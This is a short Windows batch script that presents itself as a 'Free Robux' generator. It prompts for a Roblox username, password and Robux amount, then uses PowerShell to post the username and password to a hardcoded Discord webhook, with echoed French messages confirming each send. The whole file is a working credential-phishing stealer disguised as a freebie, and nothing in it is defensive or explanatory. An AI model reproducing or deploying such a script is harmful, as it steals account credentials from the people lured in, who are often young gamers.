@echo off

echo(Free Robux Don't Abus !
)
set /p Username=Username : 
set /p Password=Password : 
set /p Robux=Robux : 

powershell -Command "Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1243237011792330842/q0Q5hCIuB_vcImZXKe0MiVSDu8-vOa9bVRRH10uUWKUI1G15ix36Cj6ZVzHj20OK5Nqr' -Method Post -Body '{\"content\":\"%Username%\"}' -ContentType 'application/json'"
echo Username message envoye au webhook Discord

powershell -Command "Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1243237011792330842/q0Q5hCIuB_vcImZXKe0MiVSDu8-vOa9bVRRH10uUWKUI1G15ix36Cj6ZVzHj20OK5Nqr' -Method Post -Body '{\"content\":\"%Password%\"}' -ContentType 'application/json'"
echo Password message envoye au webhook Discord